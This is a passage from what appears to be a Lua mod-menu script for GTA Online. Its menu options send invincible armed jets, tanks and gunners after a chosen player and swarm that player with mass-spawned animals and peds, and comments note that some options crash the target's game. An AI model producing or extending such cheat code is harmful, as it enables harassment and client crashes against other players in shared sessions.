    local lazer = entities.create_vehicle(lazer_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
    lazer_entities[#lazer_entities + 1] = lazer
    
    ENTITY.SET_ENTITY_INVINCIBLE(lazer, lazer_godmode)
    ENTITY.SET_ENTITY_VISIBLE(lazer, lazer_visible, 0)	
    VEHICLE.SET_VEHICLE_ENGINE_ON(lazer, true, true, true)
    VEHICLE.SET_HELI_BLADES_FULL_SPEED(lazer)
    VEHICLE.CONTROL_LANDING_GEAR(lazer, 3)    
    local pilots = entities.create_ped(5, ped_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
    lazer_entities[#lazer_entities + 1] = pilots
    
    PED.SET_PED_RELATIONSHIP_GROUP_HASH(pilots, util.joaat("ARMY"))
    ENTITY.SET_ENTITY_VISIBLE(pilots, lazer_visible, 0)
    PED.SET_PED_INTO_VEHICLE(pilots, lazer, -1)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(pilots, true)

    PED.SET_PED_MAX_HEALTH(pilots, 500)
    ENTITY.SET_ENTITY_HEALTH(pilots, 500)
    ENTITY.SET_ENTITY_INVINCIBLE(pilots, lazer_godmode)
    TASK.TASK_COMBAT_HATED_TARGETS_AROUND_PED(pilots, 500, 0)

    local gunners = {}
    for i  = 1, 45 do
        gunners[i] = entities.create_ped(29, ped_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
        lazer_entities[#lazer_entities + 1] = gunners[i]
        PED.SET_PED_INTO_VEHICLE(gunners[i], lazer, i)
        WEAPON.GIVE_WEAPON_TO_PED(gunners[i], util.joaat(gunner_weapon) , 9999, false, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(gunners[i], 20 --[[ they can shoot from vehicle ]], true)
        --PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(gunner[i], true)
        PED.SET_PED_MAX_HEALTH(gunners[i], 500)
        ENTITY.SET_ENTITY_HEALTH(gunners[i], 500)
        ENTITY.SET_ENTITY_INVINCIBLE(gunners[i], lazer_godmode)
        ENTITY.SET_ENTITY_VISIBLE(gunners[i], lazer_visible, 0)
        PED.SET_PED_SHOOT_RATE(gunners[i], 1000)
        PED.SET_PED_RELATIONSHIP_GROUP_HASH(gunners[i], util.joaat("ARMY"))
        TASK.TASK_COMBAT_HATED_TARGETS_AROUND_PED(gunners[i], 1000, 0)
    end
    
    util.create_tick_handler(function()
        PED.SET_RELATIONSHIP_BETWEEN_GROUPS(5, util.joaat("ARMY"), util.joaat("PLAYER"))
        PED.SET_RELATIONSHIP_BETWEEN_GROUPS(5, util.joaat("PLAYER"), util.joaat("ARMY"))
        PED.SET_RELATIONSHIP_BETWEEN_GROUPS(0, util.joaat("ARMY"), util.joaat("ARMY"))
    end)

    --notification("Army Attack sent to "..PLAYER.GET_PLAYER_NAME(pid), colors.red)
    return pilot, lazer
    end	

    local lazer_options = menu.list(Attackers_trollys, "Army Attack", {}, "")

    menu.divider(lazer_options, "Army Attack")

    lazer_visible = true
    local gunner_weapons = "weapon_combatmg"

menu.action(lazer_options, "Army Attack", {"sendarmyattack"}, "", function()
    local pilot, lazer = spawn_lazer(pid, gunner_weapons, collision)
    menu.trigger_commands("sendtank " .. players.get_name(pid))
    menu.trigger_commands("sendbuzzard " .. players.get_name(pid))
    while ENTITY.GET_ENTITY_HEALTH(pilot) > 0 do
        local player_peds = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local a = ENTITY.GET_ENTITY_COORDS(player_peds)
        local b = ENTITY.GET_ENTITY_COORDS(lazer)
        if MISC.GET_DISTANCE_BETWEEN_COORDS(a.x, a.y, a.z, b.x, b.y, b.z, true) > 90 then
            TASK.TASK_HELI_CHASE(pilot, player_peds, 0, 0, 50)
        else
            TASK.TASK_HELI_MISSION(pilot, lazer, 0, player_peds, a.x, a.y, a.z, 23, 30, -1, -1, 10, 10, 5, 0)
        end
        util.yield()
    end
end)


menu.divider(lazer_options, "Settings")

menu.toggle(lazer_options, "Invincible", {"invincarmy"}, "", function(on)
    lazer_godmode = on
end, true)

local menu_gunner_weapon_lists = menu.list(lazer_options, "Gunners Weapon")
menu.divider(menu_gunner_weapon_lists, "Gunner Weapon List")

for i = 1, #gunner_weapon_lists do
    menu.action(menu_gunner_weapon_lists, gunner_weapon_lists[i][1], {}, "", function()
        gunner_weapons = gunner_weapon_lists[i][2]
        --notification("Now gunners will shoot with "..gunner_weapon_lists[i][1].."s", colors.red)
    end)
end

menu.toggle(lazer_options, "Visible", {"visablearmy"}, "You shouldn't be that toxic to turn this off", function(on)
    lazer_visible = on
end, true)

menu.toggle(lazer_options, "Collision", {"collisionarmy"}, "When it's turned off disables world collision for army. Playes can still destroy the vehicle", function(on)
    collision = on
end, false)

menu.action(lazer_options, "Delete All", {"deletearmy"}, "Deletes all army you've spawned", function()
    menu.trigger_commands("superc")
end)

----------------------------------------------------End------------------------------------------------------------------------------

local Attacker_Tanks = menu.list(Attackers_trollys, "Attacker Tanks")

menu.action(Attacker_Tanks,"Spawn Attacker Khanjali", {"sendkhanjali"}, "", function()
    V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    if table_kidnap == nil then
        table_kidnap = {}
    end
    hash = util.joaat("khanjali")
    ped_hash = util.joaat("MP_M_Cocaine_01")
    if STREAMING.IS_MODEL_A_VEHICLE(hash) then
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do
            util.yield()
        end
        local aab = 
        {
            x = -5784.258301,
            y = -8289.385742,
            z = -136.411270
        }
        ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
        ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, false)
        table_kidnap[veh_to_attach] = entities.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
        CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
        while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
            STREAMING.REQUEST_MODEL(ped_hash)
            util.yield()
        end
        ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
        ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
        ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
            true, true, false, 0, false)
        coords_ped = v3()
        coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)
        coords_ped.x = coords_ped.x + math.random(-20, 20)
        coords_ped.y = coords_ped.y + math.random(-20, 20)
        coords_ped.z = coords_ped.z
        ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z, false, false, false, false)
        PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)

        if table_kidnap[veh_to_attach] then
            DECORATOR.DECOR_SET_INT(table_kidnap[veh_to_attach], "MPBitset", 0)
            VEHICLE.SET_VEHICLE_MOD_KIT(table_kidnap[veh_to_attach], 0)
            for i = 0 ,50 do
                VEHICLE.SET_VEHICLE_MOD(table_kidnap[veh_to_attach], i, VEHICLE.GET_NUM_VEHICLE_MODS(table_kidnap[veh_to_attach], i) - 13, false)
            end	
            VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(table_kidnap[veh_to_attach], 255, 0, 255)
            VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(table_kidnap[veh_to_attach],255, 0, 255)
            VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(table_kidnap[veh_to_attach], 10)
            VEHICLE.TOGGLE_VEHICLE_MOD(table_kidnap[veh_to_attach], 17, true)
            VEHICLE.TOGGLE_VEHICLE_MOD(table_kidnap[veh_to_attach], 18, true)
            VEHICLE.TOGGLE_VEHICLE_MOD(table_kidnap[veh_to_attach], 19, true)
            VEHICLE.TOGGLE_VEHICLE_MOD(table_kidnap[veh_to_attach], 20, true)
            VEHICLE.TOGGLE_VEHICLE_MOD(table_kidnap[veh_to_attach], 21, true)
            for i = 0 ,4 do
                if not VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(table_kidnap[veh_to_attach], i) then
                    VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(table_kidnap[veh_to_attach], i, true)
                end
            end
            VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(table_kidnap[veh_to_attach], 255, 0, 255)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(table_kidnap[veh_to_attach], "Addict")

        end
        VEHICLE.SET_VEHICLE_ENGINE_ON(table_kidnap[veh_to_attach], true, true, false)
        TASK.TASK_VEHICLE_SHOOT_AT_PED(ped_to_drive, V3, 1)
        TASK.TASK_VEHICLE_CHASE(ped_to_drive, V3)
        util.yield(1)
        entities.delete_by_handle(ped_to_kidnap)
        veh_to_attach = veh_to_attach + 1
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)
        util.toast(os.date("%H:%M:%S") .. " Khanjali Sent To Attack", TOAST_ABOVE_MAP)
    end
end)

menu.action(Attacker_Tanks,"Spawn Attacker Tank", {"sendtank"}, "", function()
    V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    if table_kidnap == nil then
        table_kidnap = {}
    end
    hash = util.joaat("rhino")
    ped_hash = util.joaat("MP_M_Cocaine_01")
    if STREAMING.IS_MODEL_A_VEHICLE(hash) then
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do
            util.yield()
        end
        local aab = 
        {
            x = -5784.258301,
            y = -8289.385742,
            z = -136.411270
        }
        ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
        ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, false)
        table_kidnap[veh_to_attach] = entities.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
        CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
        while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
            STREAMING.REQUEST_MODEL(ped_hash)
            util.yield()
        end
        ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
        ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
        ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
            true, true, false, 0, false)
        coords_ped = v3()
        coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)
        coords_ped.x = coords_ped.x + math.random(-20, 20)
        coords_ped.y = coords_ped.y + math.random(-20, 20)
        coords_ped.z = coords_ped.z
        ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z, false, false, false, false)
        PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
        VEHICLE.SET_VEHICLE_ENGINE_ON(table_kidnap[veh_to_attach], true, true, false)
        TASK.TASK_VEHICLE_SHOOT_AT_PED(ped_to_drive, V3, 1)
        TASK.TASK_VEHICLE_CHASE(ped_to_drive, V3)
        util.yield(1)
        entities.delete_by_handle(ped_to_kidnap)
        veh_to_attach = veh_to_attach + 1
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)
        util.toast(os.date("%H:%M:%S") .. " Tank Sent To Attack", TOAST_ABOVE_MAP)
    end
end)

-- set a player into a free seat in a vehicle, if any exist
local function set_player_into_suitable_seat(ent)
local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1)
if not PED.IS_PED_A_PLAYER(driver) or driver == 0 then
    if driver ~= 0 then
        entities.delete_by_handle(driver)
    end
    PED.SET_PED_INTO_VEHICLE(players.user_ped(), ent, -1)
else
    for i=0, VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(ent) do
        if VEHICLE.IS_VEHICLE_SEAT_FREE(ent, i) then
            PED.SET_PED_INTO_VEHICLE(players.user_ped(), ent, -1)
        end
    end
end
end

menu.action(Attacker_Tanks,"Spawn Attacker MiniTank", {"sendminitank"}, "", function()
    V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    if table_kidnap == nil then
        table_kidnap = {}
    end
    hash = util.joaat("minitank")
    ped_hash = util.joaat("mp_m_freemode_01")
    if STREAMING.IS_MODEL_A_VEHICLE(hash) then
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do
            util.yield()
        end
        local aab = 
        {
            x = -5784.258301,
            y = -8289.385742,
            z = -136.411270
        }
        ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
        ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, false)
        table_kidnap[veh_to_attach] = entities.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
        CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
        while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
            STREAMING.REQUEST_MODEL(ped_hash)
            util.yield()
        end
        ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
        ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
        ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
            true, true, false, 0, false)
        coords_ped = v3()
        coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)
        coords_ped.x = coords_ped.x + math.random(-20, 20)
        coords_ped.y = coords_ped.y + math.random(-20, 20)
        coords_ped.z = coords_ped.z
        ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z, false, false, false, false)
        PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
        VEHICLE.SET_VEHICLE_MOD_KIT(table_kidnap[veh_to_attach], 0)
        for i = 0, 50 do
            VEHICLE.SET_VEHICLE_MOD(table_kidnap[veh_to_attach], i, VEHICLE.GET_NUM_VEHICLE_MODS(table_kidnap[veh_to_attach], i) - 1, false)
        end
        VEHICLE.SET_VEHICLE_ENGINE_ON(table_kidnap[veh_to_attach], true, true, false)
        TASK.TASK_VEHICLE_SHOOT_AT_PED(ped_to_drive, V3, 1)
        TASK.TASK_VEHICLE_CHASE(ped_to_drive, V3)
        util.yield(1)
        entities.delete_by_handle(ped_to_kidnap)
        veh_to_attach = veh_to_attach + 1
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)
        util.toast(os.date("%H:%M:%S") .. " Tank Sent To Attack", TOAST_ABOVE_MAP)
    end
end)

menu.action(Attacker_Tanks, "Delete Tanks", {"deletetanks"}, "Deletes all tanks you've spawned", function()
    menu.trigger_commands("superc")
end)


local Armys = menu.list(Attackers_trollys, "Spam Followers")

local player_deer_army = {}
local DeerArmy = menu.list(Armys, "Deer Army")

menu.divider(DeerArmy, "__________________bruh__________________")

menu.toggle(DeerArmy, "Deer Fuck Player", {"deerfuck"}, "", function(on_toggle)
    if on_toggle then
        menu.trigger_commands("deerarmy" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("toggletppeds" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("skydivepeds" .. PLAYER.GET_PLAYER_NAME(pid))
        util.toast("Wait 5 Seconds to turn off please.")
    else
        menu.trigger_commands("cleardeers" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("toggletppeds" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("skydivepeds" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("superc")
        end        
    end)

menu.click_slider(DeerArmy, "Spawn A Deer Army", {"deerarmy"}, "They will follow you like lost...", 1, 48, 48, 1, function(val)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
    pos.y = pos.y - 5
    pos.z = pos.z + 1
    local pussy = util.joaat("A_C_Deer")
    request_model(pussy)
    for i = 1, val do
        player_deer_army[i] = entities.create_ped(28, pussy, pos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(player_deer_army[i], true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(player_deer_army[i], true)
        PED.SET_PED_COMPONENT_VARIATION(player_deer_army[i], 0, 0, 1, 0)
        TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(player_deer_army[i], ped, 0, -0.3, 0, 7.0, -1, 10, true)
        util.yield()
    end 
end)

menu.action(DeerArmy, "Clear Deer's", {"cleardeers"}, "", function()
    for i, ped in ipairs(entities.get_all_peds_as_handles()) do
        if PED.IS_PED_MODEL(ped, util.joaat("A_C_Deer")) then
            entities.delete_by_handle(ped)
        end
    end
end)

local player_boar_army = {}
local BoarArmy = menu.list(Armys, "Boar/Pig Army")

menu.divider(BoarArmy, "__________________bruh__________________")

menu.toggle(BoarArmy, "Boar/Pig Fuck Player", {"boarfuck"}, "Restart the script if they don't stop spawning instances of a A_C_Pig. Or you will crash the player with Crash event (A0:335). For some reason you will see a pig spawning pigs out its ass like a portal.", function(on_toggle)
    if on_toggle then
        menu.trigger_commands("boararmy" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("toggletppeds" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("skydivepeds" .. PLAYER.GET_PLAYER_NAME(pid))
        util.toast("Wait 5 Seconds to turn off please.")
    else
        menu.trigger_commands("clearboars" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("toggletppeds" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("skydivepeds" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("superc")
        end        
    end)

menu.click_slider(BoarArmy, "Spawn A Boar/Pig Army", {"boararmy"}, "They will follow you like lost...", 1, 48, 48, 1, function(val)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
    pos.y = pos.y - 5
    pos.z = pos.z + 1
    local pussy = util.joaat("A_C_Boar")
    request_model(pussy)
    for i = 1, val do
        player_boar_army[i] = entities.create_ped(28, pussy, pos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(player_boar_army[i], true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(player_boar_army[i], true)
        PED.SET_PED_COMPONENT_VARIATION(player_boar_army[i], 0, 0, 1, 0)
        TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(player_boar_army[i], ped, 0, -0.3, 0, 7.0, -1, 10, true)
        util.yield()
        local pussy = util.joaat("A_C_Pig")
        request_model(pussy)
        for i = 1, val do
            player_boar_army[i] = entities.create_ped(28, pussy, pos, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(player_boar_army[i], true)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(player_boar_army[i], true)
            PED.SET_PED_COMPONENT_VARIATION(player_boar_army[i], 0, 0, 1, 0)
            TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(player_boar_army[i], ped, 0, -0.3, 0, 7.0, -1, 10, true)
            util.yield()
        end
    end 
end)

menu.action(BoarArmy, "Clear Boar/Pig's", {"clearboars"}, "", function()
    for i, ped in ipairs(entities.get_all_peds_as_handles()) do
        if PED.IS_PED_MODEL(ped, util.joaat("A_C_Boar")) then
            entities.delete_by_handle(ped)
            for i, ped in ipairs(entities.get_all_peds_as_handles()) do
                if PED.IS_PED_MODEL(ped, util.joaat("A_C_Pig")) then
                    entities.delete_by_handle(ped)
                end
            end
        end
    end
end)



local player_Rabbit_army = {}
local RabbitArmy = menu.list(Armys, "Rabbit Army", {}, "")

menu.divider(RabbitArmy, "__________________bruh__________________")

menu.toggle(RabbitArmy, "Rabbit Fuck Player", {"togglerabbit"}, "", function(on_toggle)
    if on_toggle then
        menu.trigger_commands("rabbitarmy" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("toggletppeds" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("skydivepeds" .. PLAYER.GET_PLAYER_NAME(pid))
        util.toast("Wait 5 Seconds to turn off please.")
    else
        menu.trigger_commands("clearrabbits" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("toggletppeds" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("skydivepeds" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("superc")
        end        
    end)

menu.click_slider(RabbitArmy, "Spawn Rabbit Army", {"rabbitarmy"}, "", 1, 48, 48, 1, function(val)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
    pos.y = pos.y - 5
    pos.z = pos.z + 1
    local Rabbit = util.joaat("A_C_Rabbit_02")
    request_model(Rabbit)
    for i = 1, val do
        player_Rabbit_army[i] = entities.create_ped(28, Rabbit, pos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(player_Rabbit_army[i], true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(player_Rabbit_army[i], true)
        PED.SET_PED_COMPONENT_VARIATION(player_Rabbit_army[i], 0, 0, 1, 0)
        TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(player_Rabbit_army[i], ped, 0, -0.3, 0, 7.0, -1, 10, true)
--      WEAPON.GIVE_WEAPON_TO_PED(player_Rabbit_army[i], util.joaat('WEAPON_HOMINGLAUNCHER'),  9999, true, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(player_Rabbit_army[i], 20, true)
        PED.SET_PED_SHOOT_RATE(player_Rabbit_army[i], 1000)
        util.yield()
    end 
end)

menu.action(RabbitArmy, "Clear Rabbit's", {"clearrabbits"}, "", function()
    for i, ped in ipairs(entities.get_all_peds_as_handles()) do
        if PED.IS_PED_MODEL(ped, util.joaat("A_C_Rabbit_02")) then
            entities.delete_by_handle(ped)
        end
    end
end)


local player_Yule_army = {}
local YuleArmy = menu.list(Armys, "Yule Army", {}, "")

menu.divider(YuleArmy, "__________________bruh__________________")

menu.toggle(YuleArmy, "Yule Monster Fuck Player", {"toggleyulemonster"}, "Will Cause Crash Events (C0)", function(on_toggle)
    if on_toggle then
        menu.trigger_commands("yulearmy" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("toggletppeds" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("skydivepeds" .. PLAYER.GET_PLAYER_NAME(pid))
        util.toast("Wait 5 Seconds to turn off please.")
    else
        menu.trigger_commands("clearyules" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("toggletppeds" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("skydivepeds" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("superc")
        end        
    end)

menu.click_slider(YuleArmy, "Spawn Yule Monster Army", {"yulearmy"}, "", 1, 48, 48, 1, function(val)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
    pos.y = pos.y - 5
    pos.z = pos.z + 1
    local Yule = util.joaat("U_M_M_YuleMonster")
    request_model(Yule)
    for i = 1, val do
        player_Yule_army[i] = entities.create_ped(28, Yule, pos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(player_Yule_army[i], true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(player_Yule_army[i], true)
        PED.SET_PED_COMPONENT_VARIATION(player_Yule_army[i], 0, 0, 1, 0)
        TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(player_Yule_army[i], ped, 0, -0.3, 0, 7.0, -1, 10, true)
        WEAPON.GIVE_WEAPON_TO_PED(player_Yule_army[i], util.joaat('WEAPON_CANDYCANE'),  9999, true, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(player_Yule_army[i], 20, true)
        PED.SET_PED_SHOOT_RATE(player_Yule_army[i], 1000)
        util.yield()
    end 
end)

menu.action(YuleArmy, "Clear Yule's", {"clearyules"}, "", function()
    for i, ped in ipairs(entities.get_all_peds_as_handles()) do
        if PED.IS_PED_MODEL(ped, util.joaat("U_M_M_YuleMonster")) then
            entities.delete_by_handle(ped)
        end
    end
end)


local player_furry_army = {}
local FurryArmy = menu.list(Armys, "Furry Army", {}, "")

menu.divider(FurryArmy, "__________________bruh__________________")

menu.toggle(FurryArmy, "Furry Fuck Player", {"furryfuck"}, "Spawns IG Furry the new ped :)", function(on_toggle)
    if on_toggle then
        menu.trigger_commands("furryarmy" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("toggletppeds" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("skydivepeds" .. PLAYER.GET_PLAYER_NAME(pid))
        util.toast("Wait 5 Seconds to turn off please.")
    else
        menu.trigger_commands("clearfurrys" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("toggletppeds" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("skydivepeds" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("superc")
        end        
    end)

menu.click_slider(FurryArmy, "Spawn Furry Army", {"furryarmy"}, "", 1, 48, 48, 1, function(val)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
    pos.y = pos.y - 5
    pos.z = pos.z + 1
    local furry = util.joaat("IG_Furry")
    request_model(furry)
    for i = 1, val do
        player_furry_army[i] = entities.create_ped(28, furry, pos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(player_furry_army[i], true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(player_furry_army[i], true)
        PED.SET_PED_COMPONENT_VARIATION(player_furry_army[i], 0, 0, 1, 0)
        TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(player_furry_army[i], ped, 0, -0.3, 0, 7.0, -1, 10, true)
--      WEAPON.GIVE_WEAPON_TO_PED(player_furry_army[i], util.joaat('WEAPON_HOMINGLAUNCHER'),  9999, true, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(player_furry_army[i], 20, true)
        PED.SET_PED_SHOOT_RATE(player_furry_army[i], 1000)
        util.yield()
    end 
end)

menu.action(FurryArmy, "Clear Furry's", {"clearfurrys"}, "", function()
    for i, ped in ipairs(entities.get_all_peds_as_handles()) do
        if PED.IS_PED_MODEL(ped, util.joaat("IG_Furry")) then
            entities.delete_by_handle(ped)
        end
    end
end)

    local player_pussy_army = {}
    local PussyArmy = menu.list(Armys, "Pussy Army", {}, "")

    menu.divider(PussyArmy, "__________________bruh__________________")

    menu.toggle(PussyArmy, "Pussy Fuck Player", {"deerfuck"}, "", function(on_toggle)
        if on_toggle then
            menu.trigger_commands("pussyarmy" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("toggletppeds" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("skydivepeds" .. PLAYER.GET_PLAYER_NAME(pid))
            util.toast("Wait 5 Seconds to turn off please.")
        else
            menu.trigger_commands("clearpussys" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("toggletppeds" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("skydivepeds" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("superc")
            end        
        end)

    menu.click_slider(PussyArmy, "Spawn Pussy Army", {"pussyarmy"}, "", 1, 48, 48, 1, function(val)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        pos.y = pos.y - 5
        pos.z = pos.z + 1 
        local pussy = util.joaat("a_c_cat_01")
        request_model(pussy)
        for i = 1, val do
            player_pussy_army[i] = entities.create_ped(28, pussy, pos, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(player_pussy_army[i], true)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(player_pussy_army[i], true)
            PED.SET_PED_COMPONENT_VARIATION(player_pussy_army[i], 0, 0, 1, 0)
            TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(player_pussy_army[i], ped, 0, -0.3, 0, 7.0, -1, 10, true)
            util.yield()
        end 
    end)

    menu.action(PussyArmy, "Clear Pussy's", {"clearpussys"}, "", function()
        for i, ped in ipairs(entities.get_all_peds_as_handles()) do
            if PED.IS_PED_MODEL(ped, util.joaat("a_c_cat_01")) then
                entities.delete_by_handle(ped)
            end
        end
    end)

    
    local player_fathoes_army = {}
    local FathoesArmy = menu.list(Armys, "Fathoe Army", {}, "")

    menu.divider(FathoesArmy, "__________________bruh__________________")

